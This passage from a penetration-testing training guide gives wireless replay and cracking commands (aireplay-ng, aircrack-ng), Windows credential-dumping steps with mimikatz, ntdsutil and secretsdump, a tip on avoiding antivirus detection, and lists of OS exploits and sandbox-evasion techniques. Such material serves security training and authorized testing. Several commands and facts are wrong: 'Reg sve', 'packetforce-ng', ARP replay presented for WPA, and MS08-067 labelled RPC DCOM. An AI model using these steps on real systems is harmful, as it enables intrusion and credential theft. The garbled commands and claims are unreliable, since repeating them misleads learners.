IRL: Bettercap 
Replay Steps 
airmon-ng check kill 
#enable monitor mode (promiscuous) 
airmon-ng start wlan0 
airodump-ng wlan0mon 
#Find a WPA network to replay 
airodump-ng –bssid BSSIDMAC -c 6 –write output wlan0mon 
#start the replay attack by authenticating (-1 = fake authentication) 
aireplay-ng -1 0 -a BSSIDMAC -e SSIDName wlan0mon 
#send ARP requests (type3) 
aireplay-ng -3 -b BSSIDMAC wlan0mon 
aireplay-ng -1 0 -a BSSIDMAC -e SSIDName wlan0mon 
# this attack takes some time and requires other clients 
#now we crack the hashes 
aircrack-ng -b BSSIDMAC output-01.cap 
Fragmentation Attacks 
airmon-ng check kill 
aireplay-ng -5 -b BSSIDMAC -e SSIDName -h SOURCEMAC wlan0 –write output 
packetforce-ng -0 -a BSSIDMAC -h SOURCEMAC -y output-01.cap -w prgaOutput 
aireplay-ng -r prgaOutput wlan0 
Aircrack-ng 
#enable monitor mode 
airmon-ng 
#enumerate 
#kill network management services 
airmon-ng check kill 
Penetration Testing 
PUBLIC – Version 0.3 
Copyright Xservus Limited 
Page 44 
#enable monitor mode 
airmon-ng start wlan0 
#monitor 
airodump-ng wlan0mon 
#run with output saved (csv, pcap etc.) 
airodump-ng wlan0mon -w pwnWIFI 
#RUN Airodump Scan Visualizer - https://github.com/pentesteracademy/airodump-scan-visualizer 
#Load the CSV 
Specialist Systems 
Mobile Systems 
• 
Android 
• 
IOS 
Industrial Control Systems (ICS) and SCADA (supervisory control and data acquisition) 
ICS 
• 
Control Physical Devices 
• 
Tools 
o ICSExploit 
SCADA 
Supervisory control and data acquisition 
• 
SCADA Manages ICS 
Embedded Systems 
• 
Industrial Systems 
Real -Time OS’s (RTOS) 
Often does not include security features. 
Internet of Things (IoT) 
Mirai botnet created from DVRs and Baby Monitors etc. 
• 
Buffer Overflows 
• 
Command Injection 
• 
SQL injection 
• 
Syn Floods etc. 
Point of Sale Systems 
• 
Tablets 
• 
Custom Devices 
• 
Payments taken (so PCI-DSS may be in scope) 
• 
Some powered by PIs etc. 
Penetration Testing 
PUBLIC – Version 0.3 
Copyright Xservus Limited 
Page 45 
Host based Exploitation 
Exploiting hosts includes systems which include: 
• 
Windows 
• 
UNIX/LINUX (NIX) 
• 
MAC OSD (BSD Based) 
• 
Android 
• 
IOS 
Linux Package Managers 
• 
Apt (Debian/Unbuntu) - Advanced Packaging Tool 
• 
Aptitude Package Manager (Debian/Ubuntu) (this is different to apt in that it’s a GUI) 
• 
Dpkg (Debian/Ubuntu) 
• 
yum (CENTOS) -Yellowdog Updater, Modified 
• 
yast (SUSE) 
• 
RPM (REDHAT LINUX) - Redhat package manager) 
• 
Pacman (Arch Linux) 
Windows Systems and Vulnerabilities 
• 
Windows is written in a language based on C (this has no bounds checking which can lead to 
vulnerabilities) 
• 
Requires developers to code securely 
• 
Closed Source (Source code is private) 
• 
Windows 10 is > 50 million lines of code 
• 
Reliant on Vendor for Patching (however 3rdn party micro patching is a thing) 
Types of Vulnerability 
• 
Remote Code Execution 
• 
Buffer/Overflow 
• 
Denial of Service (DoS) 
• 
Memory Corruption 
• 
Privilege Escalation 
• 
Information Disclosure 
• 
Security Feature Bypasses (e.g. UAC Bypass) 
Web Application Vulnerabilities 
• 
Cross Site Scripting (XSS) 
• 
Directory Traversal 
• 
XSRF (Cross site request forgery) 
Go and see the OWASP top 10 https://owasp.org/www-project-top-ten/ 
Penetration Testing 
PUBLIC – Version 0.3 
Copyright Xservus Limited 
Page 46 
Common Windows Exploit Examples 
These are old vulnerabilities which might be useful for the exam, but it’s also good to know the 
history of common vulnerabilities: 
• 
IIS 5.0 Unicode 
• 
IIS 5.0 WebDAV 
• 
RPC DCOM (MS08-067) Buffer Overflow RCE using RPC 
• 
SMB NetAPI 
• 
Null sessions 
• 
LM password hash weaknesses 
More modern examples 
• 
MS17-010 (Eternal Blue etc.) 
• 
CVE-2018-8120 
(https://www.rapid7.com/db/modules/exploit/windows/local/ms18_8120_win32k_prive
sc) 
• 
RDP Brute Force 
• 
ALPC Task scheduler Privilege Escalation (Cve-2019-0841) 
• 
Extraction of GPP Passwords 
• 
Extraction of passwords from unattended installation files 
Dumping Hashes & Password Cracking 
• 
Hashes (stored in SAM database) 
• 
SYSKEY (Stored in the registry) 
• 
Active Directory Passwords 
o Stored in NTDS.DIT 
▪ 
MD4 (NT hash) 
▪ 
LM 
▪ 
DES_CBC_MD5 
▪ 
AES256_CTS_HMAC_SHA1 
▪ 
MD5 (WDIGEST) 
▪ 
Reversable Encrypted Clear Text Password 
• 
Certificates 
• 
Kerberos Tickets 
• 
LSA Secrets 
Techniques 
• 
Steal creds from files (e.g. GPP, SYSPREP) 
• 
Dump creds form running processes 
• 
Dump processes from memory (Hibernation files, VM memory files) 
• 
Dump creds from SAM 
• 
Dump creds from registry 
• 
Dump from NTDS.dit 
• 
Domain Controller Replication (Mimikatz/Impacket) 
• 
Keylogging 
• 
Social Engineering 
Penetration Testing 
PUBLIC – Version 0.3 
Copyright Xservus Limited 
Page 47 
Windows Credential Dumping 
Dump the SAM 
Registry export 
Reg save hklm\sam samreg.hiv 
Reg sve hklm\security securityreg.hiv 
#read these using mimikatz 
Mimikatz.exe 
lsadump::sam samreg.hiv securityreg.hiv 
Think about running mimikatz on an attacker owned system to avoid dropping to 
disk or being detected/having to disable antivirus 
Dumping Passwords Live 
(run as admin) 
Dump LogonPasswords 
Mimikatz.exe 
#enable debug privs 
Priviledge::debug 
#log to a file 
Log mimilog.log 
#dump logon passwords/hashes 
sekurlsa::logonpasswords 
Dump SAM File Kerberos Tickets 
Mimikatz.exe 
#enable debug privs 
Priviledge::debug 
#log to a file 
Log mimilog.log 
#dump logon passwords/hashes 
token::elevate 
lsadump::sam samreg.hiv securityreg.hiv 
Dumping NTDS.DIT 
Note: Here we need to create a COPY of ntds.dit (using shadowcopy, NTDS util or NinjaCopy etc. or 
you can take this from a backup) 
https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1 
#Copy the NTDS file and SYSTEM files from the target 
#example of NTDSutil 
ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q 
#Extract hashes using PowerSploit 
Get-ADDBAccount -All -DBPath ‘ntds.dit’ -BootKey SYSTEM 
#Extract using Impacket 
impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local 
Penetration Testing 
PUBLIC – Version 0.3 
Copyright Xservus Limited 
Page 48 
Common nix Vulnerabilities 
• 
Based on C 
• 
Open Source but development is inconsistent 
• 
Linux and Android allow sideloading 
• 
Common Vulnerabilities 
o POODLE 
o Heartbleed 
o XSS/XSRF 
o SQL Injection 
o SMB Overflows 
o Enumeration 
LINUX 
• 
GNU is an operating system 
• 
Linux is a KERNEL (A component of the OS) 
Common Exploits 
https://www.exploit-db.com/ 
• 
RET2LIBC 
• 
DirtyCow (Copy on Write) 
• 
Five Year Bug (2009) 
• 
Remote Root Flaw 
• 
Insecure SUDO configuration 
• 
Insecure SUDO binaries 
• 
Sticky bits 
• 
SUID BIT set 
Password Cracking for LINUX 
Credentials are stored 
• 
/etc/passwd 
• 
/etc/shadow 
On older linux distros they were just stored in cleat text in /etc/passwd 
• 
Tools: Unshadow can be used 
• 
Meterpreter: hashdump 
• 
Mimipenguin (memory dump) 
• 
Password Hashes can be passed as well e.g. SAMBA 
• 
Key Logging 
Password Hash Types (NIX) 
$1 = MD5 
$2a = Blowfish 
Penetration Testing 
PUBLIC – Version 0.3 
Copyright Xservus Limited 
Page 49 
$5 = SHAR-256 
$6 = SHAR-512 
Protocol Exploitation 
Windows 
• 
Unnecessary Services 
o IIS in Windows 2000 
• 
SMB 1.0 (Changed in Windows 10 Anniversary Build and greater) 
• 
Domain Account Password Caching 
o 10 Domain Logins Cached 
o Default accounts 
▪ 
Administrator (SID starting “S-1-5-21” and ending “-500”) 
▪ 
Guest (SID starting “S-1-5-21” and ending “-501”) 
• 
Weak Default Security Logging 
NIX 
• 
User home permissions 
• 
World-readable and writeable directories/files 
• 
Insecure mount/export options 
• 
Service with weak default settings 
• 
Apps with weak default settings 
Protocols and Services 
Windows 
• 
Supports multiple protocols and configurations 
• 
Provides Software for most services (from Microsoft) 
Linux 
• 
Supports multiple protocols and configurations 
• 
Depends on 3rd parties 
LAB Activity 
Windows 
• 
Install windows roles and features 
o Install IIS 
o Install NFS 
Linux 
• 
Install Apache2 
• 
Install Terminator 
Exploitation 
Windows 7 
• 
Exploit MS17-010 in the lab using Metasploit 
• 
Exploit MS17-010 in the lab using python exploit 
Penetration Testing 
PUBLIC – Version 0.3 
Copyright Xservus Limited 
Page 50 
File Permissions and Exploitations 
Windows 
• 
File Permissions (ACLS) 
• 
Share Permissions 
• 
Alternate Data Steams (ADS) 
o Files have two steams 
▪ 
Data 
▪ 
Resource (You can hide data in ADS e.g. you could hide a binary inside a txt 
file) 
• 
Unquoted Service Path Privilege Escalation 
o Metasploit 
o PowerSploit 
• 
DLL Hijacking 
• 
NTFS Encryption Bypass 
• 
SAM/SYSKEY offline attakcs 
• 
EFS 
o Copying EFS to a network share will decrypt them 
• 
Bitlocker Exploits 
Linux 
• 
Insecure Permissions 
• 
Sticky BIT 
• 
SUID BIT 
• 
GUID BIT 
• 
Symbolic Link/Broken Symbolic Link Exploitation 
• 
Secure Shell Escapes 
Linux Sensitive Files 
• 
/etc/profile 
• 
/etc/hosts 
• 
/etc/resolv.conf 
• 
/etc/pam.d 
• 
~/.bash_profile 
• 
~/.bash_login 
• 
~/.profile 
• 
/home 
Resources 
https://gtfobins.github.io/ 
Kernel Vulnerabilities and Exploits 
• 
Privilege Escalation 
• 
DoS 
Memory Vulnerabilities 
• 
RCE 
Penetration Testing 
PUBLIC – Version 0.3 
Copyright Xservus Limited 
Page 51 
• 
DoS 
• 
Common Vulns 
o Use-After-Free 
o Buffer Overflow 
Default Accounts 
Windows 
• 
Administrator 
• 
Guest 
• 
KRBTGT 
• 
DefaultAccount 
• 
WDAGUtility 
• 
Defaultuser() 
Linux (nix) 
/etc/passwd 
• 
root 
• 
adm 
• 
nobody 
• 
sshd 
• 
lp 
• 
uucp 
Sandboxes 
Windows 
• 
Guest 
• 
Low Priv Users (e.g. IIS_USR) 
• 
Virtual Machines 
• 
Browser Sandboxes 
• 
Adobe Flash Sandbox 
• 
Containers 
o Docker 
o Hyper-V Containers 
• 
Mobile Apps 
• 
PDF and Documents 
• 
Antivirus Quarantine Features 
• 
Defender SmartScreen 
• 
Mail Program Sandboxes 
Escape Techniques 
• 
Sleeps 
• 
Large Files 
• 
Polymorphic Malware 
• 
Rootkits/bootkits 
• 
Encryption 
Penetration Testing 
PUBLIC – Version 0.3 
Copyright Xservus Limited 
Page 52 
• 
Logic Bombs 
• 
Archive Tools 
• 
Binary Packers 
• 
Network Fast Flux (Rotating IPs or jumping hosts) 
• 
Sandbox Detection/Evasion 
MAC OS & IOS 
OS X is based on BSD (unix) 
https://www.cvedetails.com/product/156/Apple-Mac-Os-X.html?vendor_id=49 
• 
IOMobileFrameBuffer (IOS) 
High Sierra 
o Root access with NO password 
• 
Mactans 
o USB attack 
• 
Jailbreaking IOS 
o Keyraider 
• 
Thunderstrike 
o Thunderbolt bootkit (OS 10 firmware device) 
• 
iCloud API vulnerabilities 
• 
MaControl Backdoor (OS X) 
• 
Graphic Driver Vulnerability (IOS) 
Android 
• 
Theft 
• 
Lack of Encryption 
• 
Side-Loading Aps 
• 
Root devices 
• 
Weak or No Passwords 
• 
Biometric Bypass 
• 
SQLLite Injection 
• 
Excessive App Permissions 
• 
Insure application communications 
• 
No or disabled security tools e.g. Antivirus 
• 
Missing Patches/Out of Date Software 
• 
QuadRooter 
o Qualcom Chipset Vulnerability 
• 
Certifi-Gate mRST flaw 
o Allows sideloading (<Lolipop (5.1)) 
• 
Stagefright MMS Privesc and RCE (<Lolipop (5.1)) 
• 
Installer hijacking 
• 
TowelRoot (<Kitkat (4.4)) 
• 
Cross-platform protocol vulnerabilities 
o DirtyCow 
o POODLE 
Penetration Testing 
PUBLIC – Version 0.3 
Copyright Xservus Limited 
Page 53 
Physical Attacks 
• 
Unencrypted Storage 
• 
Cold Boot Attacks 